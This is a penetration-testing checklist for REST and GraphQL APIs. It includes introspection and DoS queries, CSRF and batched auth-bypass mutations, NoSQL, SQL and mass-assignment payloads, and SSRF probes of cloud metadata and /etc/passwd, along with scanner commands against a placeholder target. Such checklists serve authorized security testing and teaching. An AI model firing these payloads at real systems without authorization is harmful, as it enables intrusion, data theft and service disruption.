# REST + GraphQL Deep Testing

## Complete GraphQL Security Testing Checklist

### Introspection Probing (three-level degradation)

```graphql
# Level 1 — standard introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — reduced introspection (bypass WAF)
{ __schema { types { name } } }

# Level 3 — minimal probing
{ __type(name: "Query") { name } }
```

### DoS Attack Vectors

```graphql
# alias overload
query { a1: __typename a2: __typename ... a100: __typename }

# batched query overload
[query1, query2, ..., query10]

# circular query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# directive overload
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization Testing

```graphql
# GET mutation (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# batched query auth bypass
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## Deep REST API Testing

### Method Manipulation Matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ accessible | test unauthorized creation | test bulk overwrite | test field injection | test cascade delete | info leak |
| /users/me | baseline | — | test self-privilege-escalation | test field append | test self-delete | — |

### Parameter Injection

```json
// NoSQL injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// mass assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// parameter pollution
GET /api/users?role=user&role=admin

// JSON array injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF parameters: webhook_url, callback_url, avatar_url, import_url,
                redirect_uri, file_url, proxy_url, image_url
Test: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## Automated Toolchain

### Vespasian (traffic-driven spec generation)

```bash
# crawl from a headless browser
vespasian crawl --url https://target.com --depth 3

# import from Burp/HAR
vespasian import --file traffic.har

# export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM attack generation)

```bash
# spec-based automated testing
entropy --spec api-spec.yaml --live --persona all

# five concurrent personas:
# - malicious_insider: IDOR/mass assignment/privilege escalation
# - bot_swarm: rate-limit bypass/DoS/automation abuse
# - penetration_tester: injection/auth bypass
# - impatient_consumer: race conditions/error handling
# - confused_user: unexpected input/boundary tests

# CI mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-phase pipeline)

```bash
# Phase 1-3: GraphQL recon → exploit → brute force
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: rate-limit bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: schema harvesting
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
